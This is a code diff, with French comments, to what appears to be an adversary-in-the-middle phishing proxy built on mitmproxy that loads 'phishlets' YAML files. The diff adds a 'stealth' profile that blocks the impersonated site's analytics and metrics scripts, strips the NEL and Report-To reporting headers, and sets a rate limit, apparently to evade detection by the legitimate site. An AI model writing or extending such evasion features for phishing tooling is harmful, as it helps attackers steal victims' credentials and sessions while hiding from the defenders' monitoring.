@@ -154,10 +154,12 @@ def edge_preset(host, port):
 @click.option("--deny-ips", help="Liste CSV d'IPs refusées")
 @click.option("--http2/--no-http2", default=True, help="Activer HTTP/2 (par défaut)")
 @click.option("--conn-strategy", default="lazy", help="Stratégie de connexion mitmproxy (lazy|eager)")
-def edge_run(name, path, host, port, upstream, rate, allow_ips, deny_ips, http2, conn_strategy):
+@click.option("--profile", default="default", help="Profil (default|stealth)")
+def edge_run(name, path, host, port, upstream, rate, allow_ips, deny_ips, http2, conn_strategy, profile):
     try:
         from core.edge.proxy import EdgeProxy, EdgeConfig
         import asyncio
+        import yaml
         if not path and name:
             path = os.path.join("phishlets", f"{name}.yaml")
         if not path:
@@ -165,6 +167,35 @@ def edge_run(name, path, host, port, upstream, rate, allow_ips, deny_ips, http2,
             return
         with open(path, "r") as f:
             ph_yaml = f.read()
+        # Appliquer profil
+        if profile and profile.lower() == "stealth":
+            try:
+                data = yaml.safe_load(ph_yaml)
+                if not isinstance(data, dict):
+                    raise ValueError("phishlet YAML invalide")
+                # Blocklist agressive
+                bl = data.get("blocklist") or []
+                extra_bl = [
+                    {"pattern": "analytics|gtm|/metrics|/collect", "mimes": ["text/javascript","application/javascript"], "max_kb": 512},
+                    {"pattern": "/fonts/|/woff2|/ttf", "mimes": ["font/"], "max_kb": 256},
+                    {"pattern": "/video|/media", "mimes": ["video/"], "max_kb": 1024},
+                    {"pattern": "/images|/img|/static/", "mimes": ["image/"], "max_kb": 300},
+                ]
+                bl.extend(extra_bl)
+                data["blocklist"] = bl
+                # En-têtes: retirer NEL/Report-To si présents
+                hdrs = data.get("headers") or []
+                hdrs.extend([
+                    {"action": "remove", "name": "NEL"},
+                    {"action": "remove", "name": "Report-To"},
+                ])
+                data["headers"] = hdrs
+                ph_yaml = yaml.safe_dump(data, sort_keys=False)
+                # Réseau par défaut stealth si non surchargé
+                if rate is None:
+                    os.environ["RATE_LIMIT_PER_MINUTE"] = "60"
+            except Exception as e:
+                console.print(f"[yellow]Profil stealth non appliqué: {e}[/yellow]")
         # Environnement réseau
         if rate is not None:
             os.environ["RATE_LIMIT_PER_MINUTE"] = str(rate)
